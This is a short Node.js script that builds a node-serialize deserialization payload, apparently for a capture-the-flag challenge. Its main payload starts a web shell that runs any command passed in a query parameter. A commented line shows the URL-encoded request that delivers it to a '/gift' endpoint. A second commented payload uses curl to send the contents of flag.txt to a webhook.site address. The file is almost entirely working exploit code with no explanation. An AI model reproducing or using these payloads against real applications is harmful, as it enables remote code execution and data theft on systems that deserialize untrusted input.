var serialize = require('node-serialize');
var payload = {
    "webShell" : "_$$ND_FUNC$$_function(){const http = require('http'); const url = require('url'); const ps  = require('child_process'); http.createServer(function (req, res) { var queryObject = url.parse(req.url,true).query; var cmd = queryObject['cmd']; try { ps.exec(cmd, function(error, stdout, stderr) { res.end(stdout); }); } catch (error) { return; }}).listen(8080); }()"
    }
console.log(serialize.serialize(payload));

// http://127.0.0.1:8000/gift?message={%22webShell%22:%22_$$ND_FUNC$$_function(){const%20http%20=%20require(%27http%27);%20const%20url%20=%20require(%27url%27);%20const%20ps%20%20=%20require(%27child_process%27);%20http.createServer(function%20(req,%20res)%20{%20var%20queryObject%20=%20url.parse(req.url,true).query;%20var%20cmd%20=%20queryObject[%27cmd%27];%20try%20{%20ps.exec(cmd,%20function(error,%20stdout,%20stderr)%20{%20res.end(stdout);%20});%20}%20catch%20(error)%20{%20return;%20}}).listen(8080);%20}()%22}



//{"curlFlag":"_$$ND_FUNC$$_function() {require('child_process').exec('curl https://webhook.site/35f62f5e-8f87-4724-bde9-dc58097f6ba9?flag=`cat flag.txt`', (error, stdout, stderr) => { console.log(stdout); }); } ()"}
